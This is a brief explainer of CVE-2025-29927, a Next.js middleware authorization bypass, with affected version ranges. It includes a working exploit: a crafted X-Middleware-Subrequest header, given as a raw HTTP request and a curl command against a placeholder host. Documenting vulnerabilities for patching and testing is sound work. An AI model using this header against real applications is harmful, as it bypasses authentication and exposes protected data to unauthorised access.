`Next.js` is a popular React framework for building full‑stack web applications (server‑side rendering, routing, middleware, API routes).

`CVE‑2025‑29927` is a critical authorization‑bypass in Next.js middleware: when an app performs auth checks in middleware, an attacker can craft a request that makes the framework treat the request as an internal subrequest, bypassing those checks.

The vulnerability affects Next.js versions `r!11.1.4` through `r!13.5.6`, `r!14.x` before `r!14.2.25`, and `r!15.x` before `r!15.2.3`.

<b>How to exploit:</b>
`r!Do not run against systems you don't own/authorize!`

To exploit the vulnerability, add the `x-middleware-subrequest: middleware` header to the HTTP request to bypass Next.js middleware authentication checks.

<b>Example:</b>
HTTP Request:
```
GET /dashboard HTTP/1.1
Host: vulnerable.example
X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
```
curl:
```
curl -v -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware" \
  https://vulnerable.example/dashboard
```
